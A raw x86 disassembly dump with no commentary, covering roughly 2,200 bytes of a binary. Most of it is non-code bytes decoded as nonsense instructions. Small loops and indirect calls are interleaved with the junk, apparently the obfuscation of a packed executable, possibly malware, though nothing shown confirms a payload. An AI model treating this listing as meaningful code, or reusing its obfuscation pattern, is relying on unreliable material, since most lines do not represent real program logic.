  402121:	scas   al,BYTE PTR es:[edi]
  402122:	pop    edi
  402123:	(bad)  
  402124:	pop    edx
  402125:	jae    0x40219d
  402127:	sub    DWORD PTR [ebx],edi
  402129:	mov    al,ds:0x35f65ff7
  40212e:	stc    
  40212f:	add    edx,esi
  402131:	push   cs
  402132:	jne    0x4020de
  402134:	das    
  402135:	sbb    ebp,0x6194a390
  40213b:	pop    ebp
  40213c:	adc    DWORD PTR [esi],ebx
  40213e:	pusha  
  40213f:	dec    eax
  402140:	inc    edx
  402141:	mov    ?,WORD PTR [edi+0x32f08596]
  402147:	push   ebx
  402148:	adc    bh,BYTE PTR [esi]
  40214a:	test   BYTE PTR cs:[ebx+0x40],bl
  40214e:	pop    esi
  40214f:	shl    DWORD PTR [ebp+0x1aaf6e3a],0x29
  402156:	cmp    edi,DWORD PTR [eax+0x65d46f28]
  40215c:	adc    edi,DWORD PTR [edi+0x48d50544]
  402162:	fsubr  QWORD PTR [esp+edi*1+0x47303192]
  402169:	mov    dh,BYTE PTR [ebx]
  40216b:	sti    
  40216c:	addr16 mov edx,eax
  40216f:	push   0xffffff89
  402171:	pop    ds
  402172:	imul   ebx,DWORD PTR [edx],0x5f
  402175:	push   eax
  402176:	push   ds
  402177:	out    dx,al
  402178:	in     al,0xf7
  40217a:	es imul edi,ebx,0x8fba0214
  402181:	jo     0x402157
  402183:	data16 cld 
  402185:	mov    ebx,0x15495f2d
  40218a:	(bad)  
  40218b:	pop    ds
  40218c:	jb     0x40218b
  40218e:	rcl    DWORD PTR [edx+0x62],cl
  402191:	mov    ebx,0x2eec4fc3
  402196:	inc    eax
  402197:	and    al,0x80
  402199:	dec    BYTE PTR [ebp+0x611b00a5]
  40219f:	jno    0x4021fa
  4021a1:	aaa    
  4021a2:	inc    eax
  4021a3:	sub    eax,0xe0b9a66e
  4021a8:	retf   
  4021a9:	popa   
  4021aa:	call   0x967f:0x944d19ab
  4021b1:	sub    dl,bh
  4021b3:	(bad)  
  4021b4:	rol    cl,cl
  4021b6:	test   BYTE PTR [edi],0xb4
  4021b9:	and    esp,edi
  4021bb:	sub    eax,0x288a4bb8
  4021c0:	cmp    BYTE PTR [eax+0x4a],bl
  4021c3:	and    ecx,edx
  4021c5:	bound  edx,QWORD PTR [ebx+0x5]
  4021c8:	mov    BYTE PTR [ebx-0x3b],ch
  4021cb:	mov    ds:0x20ae9cbf,al
  4021d0:	add    DWORD PTR [edx-0x737e2f09],edi
  4021d6:	jmp    0x4021e0
  4021d8:	add    eax,0xa3a625c2
  4021dd:	pop    esi
  4021de:	(bad)
  4021e1:	fisub  WORD PTR [ebx]
  4021e3:	sub    edi,DWORD PTR fs:[ebx+0x1ca47295]
  4021ea:	and    al,0x8e
  4021ec:	aaa    
  4021ed:	pop    es
  4021ee:	lods   al,BYTE PTR ds:[esi]
  4021ef:	push   ecx
  4021f0:	xchg   ebx,eax
  4021f1:	or     DWORD PTR [edx],esi
  4021f3:	mov    esp,0xd65f6e88
  4021f8:	and    eax,0x330b8302
  4021fd:	push   ecx
  4021fe:	and    DWORD PTR [edx+0x38c8208d],eax
  402204:	lods   al,BYTE PTR ds:[esi]
  402205:	inc    ecx
  402206:	pop    eax
  402207:	frstor [edx-0x7af075db]
  40220d:	adc    eax,0x26d4ce4a
  402212:	bound  ebp,QWORD PTR fs:[ebx+0x7c]
  402216:	inc    ebp
  402217:	and    edx,ecx
  402219:	jge    0x4021d6
  40221b:	sub    DWORD PTR es:[edi+0x6d0303c4],ecx
  402222:	test   eax,0x2789aeb4
  402227:	iret   
  402228:	pop    esi
  402229:	xchg   ebp,eax
  40222a:	outs   dx,BYTE PTR ds:[esi]
  40222b:	lods   eax,DWORD PTR ds:[esi]
  40222c:	pop    ecx
  40222d:	cmp    DWORD PTR [edi+0x76e5c599],edi
  402233:	adc    bl,dh
  402235:	mov    DWORD PTR [edx],edi
  402237:	call   0x23d5:0x6a103ea5
  40223e:	pop    ds
  40223f:	mov    ebx,0xbae47a14
  402244:	sbb    eax,0x5f1aa495
  402249:	iretw  
  40224b:	test   eax,0xee1fad4c
  402250:	(bad)  
  402251:	or     DWORD PTR [esi+0x4f2b0b2a],ebx
  402257:	ficomp WORD PTR [edi]
  402259:	sbb    ah,dh
  40225b:	ror    DWORD PTR [ebp+0x28d3934],1
  402261:	mov    BYTE PTR [edx],dh
  402263:	cs mov ebp,0xf36972ea
  402269:	shr    BYTE PTR [esi],0xae
  40226c:	push   ds
  40226d:	jae    0x4022ba
  40226f:	fwait
  402270:	call   0x4958:0x93d237bf
  402277:	test   al,0x39
  402279:	out    dx,eax
  40227a:	or     BYTE PTR [ecx-0x73674b27],0xff
  402281:	out    0x45,eax
  402283:	stc    
  402284:	add    DWORD PTR [ecx+0x2a],0x6c
  402288:	add    eax,0xabb1b9ab
  40228d:	inc    esi
  40228e:	mov    bl,0x95
  402290:	data16 xlat BYTE PTR ds:[ebx]
  402292:	mov    WORD PTR ds:0x542e716,ss
  402298:	inc    edx
  402299:	(bad)
  40229c:	jp     0x4022af
  40229e:	outs   dx,BYTE PTR ds:[esi]
  40229f:	cld    
  4022a0:	jbe    0x4022df
  4022a2:	mov    esi,0xfadfc4ed
  4022a7:	sar    DWORD PTR [ebx+0x6b],0x99
  4022ab:	mov    al,0x5
  4022ad:	mov    esi,0x9781864d
  4022b2:	jmp    0x7ef2de43
  4022b7:	aad    0xec
  4022b9:	push   esi
  4022ba:	(bad)  [edx+0x4d1e76ae]
  4022c0:	pop    es
  4022c1:	repnz fadd DWORD PTR [edx+edx*1-0x68efad79]
  4022c9:	cli    
  4022ca:	push   ds
  4022cb:	push   ecx
  4022cc:	and    DWORD PTR ds:0x42ec6f,0x0
  4022d6:	mov    edx,DWORD PTR ds:0x42ec6f
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42ec6f,edx
  4022e3:	cmp    DWORD PTR ds:0x42ec6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e83f
  4022fe:	cmp    DWORD PTR ds:0x42ec6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4302c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4302c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4302c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e82f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4302c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4302c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	push   eax
  402362:	fs aaa 
  402364:	leave  
  402365:	fild   DWORD PTR [ebx]
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x402369
  40236e:	mov    cl,0x84
  402370:	shl    DWORD PTR [eax+0x4],1
  402373:	les    eax,FWORD PTR [edx]
  402375:	shl    DWORD PTR [ebp+esi*4+0x6c1f852f],0x59
  40237d:	addr16 pop es
  40237f:	cmp    edi,ecx
  402381:	sti    
  402382:	or     ebp,DWORD PTR [ebp+0x2fff27]
  402388:	outs   dx,BYTE PTR ds:[esi]
  402389:	xchg   esi,eax
  40238a:	mov    dl,0x97
  40238c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40238d:	call   0xbbc5:0xeb734721
  402394:	pop    esi
  402395:	pusha  
  402396:	mov    esp,0xd6bbbe4e
  40239b:	and    al,0xc2
  40239d:	sub    edi,DWORD PTR [ebx-0x293396eb]
  4023a3:	adc    eax,DWORD PTR ds:0x2093083
  4023a9:	shr    BYTE PTR [esi-0x4f],0x6d
  4023ad:	mov    esp,0xc40518e0
  4023b2:	cli    
  4023b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023b4:	xacquire xchg DWORD PTR [eax-0x1ddcebef],ecx
  4023bb:	rcr    ch,0x13
  4023be:	pop    ds
  4023bf:	mov    dl,0x45
  4023c1:	(bad)  
  4023c2:	dec    eax
  4023c3:	in     al,dx
  4023c4:	shl    BYTE PTR [eax],cl
  4023c6:	jmp    0xae17e0b4
  4023cb:	sbb    BYTE PTR [edi+0x202ec0ff],bh
  4023d1:	mov    edi,0x72c524f3
  4023d6:	xor    dl,BYTE PTR [esi+0x76]
  4023d9:	add    ch,BYTE PTR [edx+0x52e3bc08]
  4023df:	fsubr  st(6),st
  4023e1:	scas   eax,DWORD PTR es:[edi]
  4023e2:	out    dx,al
  4023e3:	lds    ebp,FWORD PTR [esi-0x5aca3aaa]
  4023e9:	sbb    DWORD PTR [ecx-0x43e96432],0x5f
  4023f0:	int    0x1
  4023f2:	jbe    0x40245c
  4023f4:	rcl    DWORD PTR [esp+edx*2-0x2a],cl
  4023f8:	add    DWORD PTR [edi-0x6b40787c],esi
  4023fe:	or     al,0x5a
  402400:	pushf  
  402401:	into   
  402402:	cmp    ebp,DWORD PTR [eax]
  402404:	(bad)  
  402405:	out    0xf2,al
  402407:	inc    esi
  402408:	inc    edi
  402409:	outs   dx,BYTE PTR ds:[esi]
  40240a:	and    eax,0xff5a773f
  40240f:	cs pusha 
  402411:	dec    ebp
  402412:	(bad)  
  402413:	and    DWORD PTR [esi+0x1e],ecx
  402416:	mov    cl,cl
  402418:	(bad)  
  40241a:	sub    eax,0xa824608c
  40241f:	pop    ebx
  402420:	jp     0x40246b
  402422:	or     DWORD PTR [esi+edi*8],edx
  402425:	cmp    edx,DWORD PTR [eax]
  402427:	in     eax,0x14
  402429:	xchg   ebp,eax
  40242a:	scas   eax,DWORD PTR es:[edi]
  40242b:	or     bl,BYTE PTR ds:0x40169bda
  402431:	nop
  402432:	sbb    cl,BYTE PTR [edi]
  402434:	test   eax,0x819b6960
  402439:	cmc    
  40243a:	and    BYTE PTR [edi+0x58],0x86
  40243e:	sub    bl,BYTE PTR [esi]
  402440:	je     0x4023f7
  402442:	pusha  
  402443:	jmp    0x4024c4
  402445:	xor    eax,DWORD PTR [ecx]
  402447:	inc    ecx
  402448:	xchg   BYTE PTR [esi-0x5647ba0a],cl
  40244e:	popa   
  40244f:	and    eax,0x41ee4225
  402454:	add    eax,0x7bac11e0
  402459:	shl    DWORD PTR [bx+di+0x74],cl
  40245d:	pushf  
  40245e:	aad    0x72
  402460:	cmp    dl,BYTE PTR [esi+0x2f]
  402463:	(bad)  
  402464:	jb     0x402411
  402466:	loopne 0x40249d
  402468:	imul   edx,eax,0x889a2ac2
  40246e:	pop    eax
  40246f:	sbb    DWORD PTR [eax],ecx
  402471:	stos   DWORD PTR es:[edi],eax
  402472:	loope  0x4024b5
  402474:	mov    bh,0xf
  402476:	sbb    esi,edx
  402478:	cmp    eax,0x1a08191
  40247d:	adc    DWORD PTR [edi-0x3e],edx
  402480:	bound  esp,QWORD PTR [ebx-0x776c437]
  402486:	dec    ecx
  402487:	cmc    
  402488:	in     al,dx
  402489:	add    dh,dh
  40248b:	ret    0x3600
  40248e:	jno    0x402421
  402490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402491:	cwde   
  402492:	or     DWORD PTR [esi+0x629302de],edi
  402498:	iret   
  402499:	addr16 xchg edi,eax
  40249b:	cdq    
  40249c:	gs cmp ebx,ecx
  40249f:	xchg   esp,eax
  4024a0:	imul   edi,DWORD PTR [ebx],0xf0197240
  4024a6:	repz test DWORD PTR [edx+0x24f84db0],eax
  4024ad:	push   ds
  4024ae:	out    0x85,al
  4024b0:	daa    
  4024b1:	cmc    
  4024b2:	sbb    al,0xdb
  4024b4:	enter  0x9f95,0xff
  4024b8:	push   ebp
  4024b9:	or     BYTE PTR [edi+0x6088f38c],ah
  4024bf:	test   DWORD PTR ds:0x348a93a9,esp
  4024c5:	or     bl,ah
  4024c7:	ja     0x402498
  4024c9:	mov    DWORD PTR [ecx-0x51],edx
  4024cc:	clc    
  4024cd:	fnstcw WORD PTR [edi+0x52174936]
  4024d3:	sub    eax,DWORD PTR [ebp+0x46933ba6]
  4024d9:	xor    edi,eax
  4024db:	mov    ss,WORD PTR [edi-0x25]
  4024de:	or     DWORD PTR [edx+0x75],esi
  4024e1:	push   es
  4024e2:	push   0x6c
  4024e4:	xor    eax,0x6113ab5b
  4024e9:	pop    edx
  4024ea:	jno    0x40253b
  4024ec:	push   es
  4024ed:	clc    
  4024ee:	add    BYTE PTR [ebp-0x470c1700],0xe3
  4024f5:	mov    ah,0xf4
  4024f7:	mov    ecx,0x9df0b455
  4024fc:	mov    ebp,0x7387d54d
  402501:	ficomp DWORD PTR [eax]
  402503:	loope  0x4024c3
  402505:	mov    ss,edx
  402507:	jno    0x40252a
  402509:	mov    ds:0x32048cc5,eax
  40250e:	adc    BYTE PTR [esi+eax*8],bh
  402511:	data16 (bad) 
  402514:	sub    BYTE PTR [ecx+0x6ab1ad00],al
  40251a:	pusha  
  40251b:	xchg   ebx,eax
  40251c:	sub    BYTE PTR [edi],dl
  40251e:	jmp    0x4024bd
  402520:	fld    TBYTE PTR [edi+0x33988537]
  402526:	retf   
  402527:	add    ebx,DWORD PTR [eax+0x4f]
  40252a:	sbb    al,0xe9
  40252c:	xor    bl,BYTE PTR [ecx+esi*2+0xb]
  402530:	rcr    BYTE PTR [ecx+0x1b],0xef
  402534:	mov    dh,0x35
  402536:	les    eax,FWORD PTR [ebx+0x16]
  402539:	sub    bl,cl
  40253b:	xchg   DWORD PTR [edi+0x73],eax
  40253e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40253f:	loop   0x402588
  402541:	ja     0x4025ba
  402543:	ja     0x4024dc
  402545:	inc    edx
  402546:	adc    edx,DWORD PTR [ebx]
  402548:	push   ecx
  402549:	and    DWORD PTR ds:0x42ec4b,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ec73
  40255f:	xor    edx,DWORD PTR ds:0x42ec4f
  402565:	mov    DWORD PTR ds:0x42ec73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4302e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4302c5
  402592:	and    DWORD PTR ds:0x42ec57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43034f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43034f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43034f,esi
  4025b8:	cmp    DWORD PTR ds:0x43034f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43034f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e6c6
  4025d7:	call   DWORD PTR ds:0x42e843
  4025dd:	cmp    DWORD PTR ds:0x43034f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43034f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43034f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs es pop ebx
  402614:	dec    ebp
  402615:	and    DWORD PTR [esi],edi
  402617:	add    DWORD PTR [esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x402662
  40261f:	mov    esp,0x3c84b73b
  402624:	retf   
  402625:	adc    BYTE PTR [edx-0x1aeb3d6d],0xb5
  40262c:	mov    bh,0xbf
  40262e:	mov    dl,BYTE PTR [ebx+0x36bb80bd]
  402634:	shl    esp,1
  402636:	cmp    al,0x9c
  402638:	mov    ebx,0x86d68756
  40263d:	pop    ecx
  40263e:	aaa    
  40263f:	sub    eax,0x8e1faa1
  402644:	cwde   
  402645:	sar    DWORD PTR [ebx],0xe6
  402648:	pop    eax
  402649:	jmp    0xcb12:0x8c4fab74
  402650:	jae    0x402694
  402652:	xchg   ebp,eax
  402653:	imul   ecx,DWORD PTR [ecx+0x30],0x5ebd16f0
  40265a:	mov    al,al
  40265c:	dec    edi
  40265d:	retf   0x8897
  402660:	ins    DWORD PTR es:[edi],dx
  402661:	fcom   DWORD PTR [eax-0x5aeea6bd]
  402667:	sub    esp,DWORD PTR [ebx-0x105387cb]
  40266d:	outs   dx,DWORD PTR ds:[esi]
  40266e:	imul   eax,DWORD PTR [ecx+0x5],0x71
  402672:	ins    DWORD PTR es:[edi],dx
  402673:	pop    eax
  402674:	cwde   
  402675:	pop    ds
  402676:	loop   0x40264a
  402678:	clc    
  402679:	sbb    BYTE PTR [esi],dh
  40267b:	fucomp st(0)
  40267d:	es cmp BYTE PTR fs:[eax+0x5dbb0518],ch
  402685:	ret    0xdd09
  402688:	cmp    eax,0x45d86612
  40268d:	and    al,0xb0
  40268f:	int    0x26
  402691:	mov    bh,0x83
  402693:	lock pop ecx
  402695:	adc    al,0x36
  402697:	arpl   WORD PTR [edi+0x4cf3d69b],bp
  40269d:	aas    
  40269e:	pop    eax
  40269f:	lods   al,BYTE PTR ds:[esi]
  4026a0:	xor    ah,dh
  4026a2:	mov    ebp,0x71a48323
  4026a7:	ins    DWORD PTR es:[edi],dx
  4026a8:	or     al,0x10
  4026aa:	ror    DWORD PTR [ebx+0x504e392c],0xb4
  4026b1:	cwde   
  4026b2:	nop
  4026b3:	rcl    BYTE PTR ds:0xfe837a5c,cl
  4026b9:	push   0x34
  4026bb:	cmp    esp,DWORD PTR [ebx]
  4026bd:	mov    WORD PTR [ecx+ebx*2-0x1fe69aa0],cs
  4026c4:	or     eax,DWORD PTR [ecx+0x37]
  4026c7:	dec    edx
  4026c8:	xchg   ebx,eax
  4026c9:	mov    cl,0x30
  4026cb:	jno    0x402703
  4026cd:	rcl    ecx,0x94
  4026d0:	sbb    eax,0x27ac72aa
  4026d5:	xchg   edx,eax
  4026d6:	jmp    eax
  4026d8:	jno    0x402662
  4026da:	dec    esp
  4026db:	loop   0x40268e
  4026dd:	add    BYTE PTR [ebx],dl
  4026df:	push   es
  4026e0:	pop    ecx
  4026e1:	xor    DWORD PTR [edi+0x3c14c8d0],0x61
  4026e8:	pusha  
  4026e9:	xlat   BYTE PTR ds:[ebx]
  4026ea:	and    al,0xae
  4026ec:	sub    BYTE PTR [edx-0x4f9c3124],cl
  4026f2:	ja     0x402762
  4026f4:	inc    ebx
  4026f5:	mov    ch,0xde
  4026f7:	pop    es
  4026f8:	test   al,0x2a
  4026fa:	pop    ebx
  4026fb:	adc    al,bh
  4026fd:	xor    BYTE PTR [esi+0x35227491],dl
  402703:	gs sbb eax,0x3748ef3b
  402709:	rol    dh,0x30
  40270c:	call   0xce8d42d6
  402711:	sbb    DWORD PTR fs:[esi],0xffffffe5
  402715:	not    ah
  402717:	cmp    DWORD PTR [esi+0x1],edi
  40271a:	xchg   edx,eax
  40271b:	imul   eax,DWORD PTR [edx-0x15],0xbbd24a89
  402722:	(bad)  [ebp+0x219b6de0]
  402728:	mov    es,WORD PTR [ebx]
  40272a:	mov    bl,0x63
  40272c:	push   0x5b
  40272e:	sbb    DWORD PTR [edi+ebx*8],ecx
  402731:	dec    edi
  402732:	mov    dh,0x3d
  402734:	lea    eax,[ecx-0x2240dd17]
  40273a:	sbb    DWORD PTR [eax],0x2488dbd5
  402740:	pushf  
  402741:	cld    
  402742:	jne    0x402709
  402744:	add    al,0x52
  402746:	and    eax,0x6a1ad40
  40274b:	push   esp
  40274c:	jns    0x4026fe
  40274e:	xchg   esp,eax
  40274f:	pop    eax
  402750:	or     eax,0xd0309dad
  402755:	add    al,0x9
  402757:	jmp    0xaf26:0x518dbf21
  40275e:	xchg   esi,eax
  40275f:	sbb    edi,DWORD PTR [ebp-0x6016e58a]
  402765:	out    dx,eax
  402766:	pop    esi
  402767:	xor    al,0x70
  402769:	test   BYTE PTR gs:[esi+0x155589f3],bl
  402770:	jmp    0xf04dc443
  402775:	daa    
  402776:	dec    ebp
  402777:	and    eax,0x452ada9d
  40277c:	aas    
  40277d:	lds    eax,FWORD PTR [ecx+0x474446fe]
  402783:	add    DWORD PTR [ebp-0x18],esi
  402786:	mov    bl,BYTE PTR [edx-0x33]
  402789:	lods   al,BYTE PTR ds:[esi]
  40278a:	add    DWORD PTR [ebp-0x18],esp
  40278d:	outs   dx,DWORD PTR ds:[esi]
  40278e:	je     0x4027c8
  402790:	nop
  402791:	addr16 out 0xb5,al
  402794:	jns    0x402765
  402796:	xor    ebx,ecx
  402798:	push   esp
  402799:	or     eax,0x393b2570
  40279e:	ins    BYTE PTR es:[edi],dx
  40279f:	sub    bh,bh
  4027a1:	es stos BYTE PTR es:[edi],al
  4027a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027a4:	repz mov ds:0x168b8b94,al
  4027aa:	xchg   edi,eax
  4027ab:	inc    esp
  4027ac:	out    dx,eax
  4027ad:	add    DWORD PTR [ebp+0x75],esi
  4027b0:	loop   0x4027c5
  4027b2:	dec    ecx
  4027b3:	mov    bh,0x7e
  4027b5:	das    
  4027b6:	push   cx
  4027b8:	bound  esi,QWORD PTR [ebp+eiz*4+0x75]
  4027bc:	and    eax,0x5c85caa6
  4027c1:	jns    0x4027b5
  4027c3:	add    eax,edx
  4027c5:	in     eax,0xd5
  4027c7:	mov    ebp,0x7f0ad474
  4027cc:	xchg   esp,edi
  4027ce:	add    BYTE PTR [edi+0x64a4ee9b],bl
  4027d4:	mov    BYTE PTR [edi-0x6],ch
  4027d7:	fistp  DWORD PTR [esi]
  4027d9:	or     DWORD PTR [eax+0x5d],eax
  4027dc:	add    eax,ebx
  4027de:	fbstp  TBYTE PTR [esi+0x4c]
  4027e1:	push   ebp
  4027e2:	mov    dh,0x4b
  4027e4:	mov    ah,0x52
  4027e6:	xchg   edi,eax
  4027e7:	xchg   BYTE PTR [edx],bh
  4027e9:	std    
  4027ea:	and    eax,0xe7e23365
  4027ef:	dec    esi
  4027f0:	push   ebp
  4027f1:	cmc    
  4027f2:	mov    esi,0x7eba51aa
  4027f7:	xchg   ecx,eax
  4027f8:	xor    dl,BYTE PTR [edi-0x75]
  4027fb:	jge    0x40280d
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [edx+0x15ddb1f7],ebx
  40282c:	movd   DWORD PTR [esi+0x55],mm7
  402830:	jg     0x4028b0
  402832:	jle    0x402836
  402834:	pop    esp
  402835:	fiadd  DWORD PTR [ecx+0x16be9f51]
  40283b:	mov    ebx,0x176ccf5f
  402840:	push   edx
  402841:	popf   
  402842:	mov    ds:0x26000498,al
  402847:	mov    al,ds:0xac73d757
  40284c:	mov    ds:0x7de45fc4,eax
  402851:	ins    DWORD PTR es:[edi],dx
  402852:	ss push es
  402854:	je     0x40285d
  402856:	scas   eax,DWORD PTR es:[edi]
  402857:	test   edi,ebp
  402859:	leave  
  40285a:	clc    
  40285b:	dec    edx
  40285c:	mov    ch,0x5a
  40285e:	or     eax,0x9807e299
  402863:	mov    ecx,0xcaf74d8d
  402868:	push   cs
  402869:	sub    al,0x7a
  40286b:	jecxz  0x40285c
  40286d:	dec    esi
  40286e:	cli    
  40286f:	pusha  
  402870:	es jae 0x402827
  402873:	ret    
  402874:	ss pop ebx
  402876:	ror    ebp,0xb7
  402879:	cmc    
  40287a:	int    0x7d
  40287c:	inc    ecx
  40287d:	pop    ebx
  40287e:	jecxz  0x402834
  402880:	mov    cl,0x84
  402882:	mov    ebx,0x25111f82
  402887:	push   ecx
  402888:	dec    ebp
  402889:	cwde   
  40288a:	femms  
  40288c:	leave  
  40288d:	add    al,0x7b
  40288f:	sub    edx,eax
  402891:	add    al,0x41
  402893:	popf   
  402894:	jg     0x40285a
  402896:	jo     0x4028d1
  402898:	inc    eax
  402899:	inc    eax
  40289a:	pop    ecx
  40289b:	ins    DWORD PTR es:[edi],dx
  40289c:	or     eax,0x69f6035d
  4028a1:	out    0xac,eax
  4028a3:	dec    edx
  4028a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a5:	jl     0x402877
  4028a7:	mov    BYTE PTR [ecx*8-0x4831d378],ah
  4028ae:	mov    dh,0x42
  4028b0:	sbb    bh,ch
  4028b2:	adc    BYTE PTR [ebp+0x32],ah
  4028b5:	pop    ss
  4028b6:	cld    
  4028b7:	mov    cl,0x4c
  4028b9:	and    eax,DWORD PTR [edi-0xa467d1c]
  4028bf:	loop   0x40289a
  4028c1:	loop   0x4028fb
  4028c3:	sbb    ebx,esi
  4028c5:	call   0x4ce6:0xcd82ce85
  4028cc:	std    
  4028cd:	jne    0x402920
  4028cf:	jmp    0x70b0:0x1eba7968
  4028d6:	cdq    
  4028d7:	sbb    ah,al
  4028d9:	imul   ebp,DWORD PTR [eax-0x7f],0x1667d69e
  4028e0:	dec    eax
  4028e1:	mov    BYTE PTR ds:0x2f34184d,dl
  4028e7:	mov    esi,0x721b33fd
  4028ec:	xchg   ebp,eax
  4028ed:	or     al,0xd2
  4028ef:	and    edi,DWORD PTR [edx+0x7a]
  4028f2:	sub    cl,cl
  4028f4:	stos   DWORD PTR es:[edi],eax
  4028f5:	iret   
  4028f6:	push   0x75
  4028f8:	stc    
  4028f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028fa:	ds jne 0x4028b6
  4028fd:	retf   0x22f6
  402900:	das    
  402901:	imul   edx,esi,0xd3ddb5b8
  402907:	popa   
  402908:	jp     0x402931
  40290a:	mov    ch,0x22
  40290c:	or     DWORD PTR [esp+ebx*2+0x61],ecx
  402910:	js     0x4028aa
  402912:	and    eax,0x24834742
  402917:	ret    0xc2c1
  40291a:	pusha  
  40291b:	jb     0x40290e
  40291d:	loop   0x4028c3
  40291f:	shl    eax,0x2d
  402922:	inc    edx
  402923:	mov    ds:0x16e7e8a1,al
  402928:	add    BYTE PTR [ebx+0x1],dh
  40292b:	fwait
  40292c:	jns    0x402947
  40292e:	push   es
  40292f:	or     eax,0xce262b45
  402934:	inc    esi
  402935:	into   
  402936:	or     ch,BYTE PTR [ebx-0x20b74efc]
  40293c:	xchg   edx,eax
  40293d:	xchg   ecx,eax
  40293e:	adc    eax,0x87fe1ab7
  402943:	add    DWORD PTR [ecx],ebx
  402945:	inc    eax
  402946:	clc    
  402947:	call   0xabc76473
  40294c:	out    dx,al
  40294d:	mov    al,ds:0x4dd686ce
  402952:	mov    eax,DWORD PTR [eax+esi*1]
  402955:	or     ch,bl
  402957:	sub    ah,BYTE PTR ds:0x9cb744c5
  40295d:	div    BYTE PTR [esp+ebx*4-0x7161afe6]
  402964:	mov    esp,0x5d65008c
  402969:	lea    edi,[ecx+eax*2]
  40296c:	ins    DWORD PTR es:[edi],dx
  40296d:	addr16 nop
  40296f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402970:	(bad)  [ecx-0x48]
  402973:	push   ebx
  402974:	test   eax,0x802225c5
  402979:	xchg   BYTE PTR [edx],ah
  40297b:	mov    edx,0x6b218509
  402980:	adc    BYTE PTR [esi+ebp*1-0x46374fb3],dl
  402987:	das    
  402988:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40298a:	shl    ch,0x45
  40298d:	push   ebp
  40298e:	mov    ebp,0xe61da912
  402993:	cld    
  402994:	xor    BYTE PTR [edi-0xd],bl
  402997:	in     eax,0x67
  402999:	push   ds
  40299a:	loopne 0x4029df
  40299c:	out    0x40,eax
  40299e:	(bad)  
  40299f:	in     al,0xda
  4029a1:	or     edi,esp
  4029a3:	scas   eax,DWORD PTR es:[edi]
  4029a4:	pusha  
  4029a5:	fcomp  DWORD PTR [edi+0x28895e36]
  4029ab:	cld    
  4029ac:	inc    ecx
  4029ad:	sbb    esp,DWORD PTR [ecx+0x39dd8c68]
  4029b3:	out    0x59,eax
  4029b5:	(bad)  
  4029b6:	fcmovnbe st,st(1)
  4029b8:	lock inc eax
  4029ba:	ret    0x6adf
  4029bd:	icebp  
  4029be:	add    edx,DWORD PTR [ecx]
  4029c0:	dec    ecx
  4029c1:	icebp  
  4029c2:	test   al,0x4e
  4029c4:	daa    
  4029c5:	int3   
  4029c6:	adc    BYTE PTR [eax],ch
  4029c8:	shr    BYTE PTR [edi+0x29c8cf5],0x97
  4029cf:	jge    0x402a08
  4029d1:	mov    ds,WORD PTR [edi]
  4029d3:	sbb    DWORD PTR [edx+0x6b0e8b24],edx
  4029d9:	jnp    0x402a0b
  4029db:	fild   QWORD PTR ds:0xbf6b52e8
  4029e1:	lahf   
  4029e2:	data16 out 0x53,al
  4029e5:	test   edx,edx
  4029e7:	ds int3 
  4029e9:	aaa    
